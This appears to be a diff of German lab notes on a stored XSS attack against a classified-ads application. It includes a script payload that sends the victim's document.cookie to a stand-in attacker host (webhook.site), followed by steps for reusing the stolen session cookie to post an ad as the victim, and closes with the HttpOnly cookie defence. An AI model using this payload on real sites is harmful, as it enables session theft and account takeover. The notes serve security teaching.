@@ -2,11 +2,13 @@ Payload in XSS anfällige Beschreibung einer Anzeige schreiben. Die Beschreibung
 "https://webhook.site/random-webhook-id" steht hier stellvertretend für die Domain vom attacker.
 <script>document.write(`<img src='https://webhook.site/random-webhook-id?c=${document.cookie}'></img>`)</script>
 
-Cookies des Opfers abfangen
+Cookies des Opfers abfangen und auf https://webhook.site unter Query Strings auslesen.
 
 Cookie für eigene Anfragen nutzen.
 Im Browser Dev Tools > Web-Speicher zum manuellen Setzen von Cookie Werten.
 
+Eine Anzeige im Namen des Opfers schalten
+
 Zum Schutz vor diesem Angriff muss der Cookie auf HttpOnly gesetzt werden, damit Javascript Code keinen Zugriff mehr auf ihn hat.
-In application.properties hinzufügen:
-server.servlet.session.cookie.http-only=true
+In WebMvcConfig entfernen:
+context.setUseHttpOnly(false);
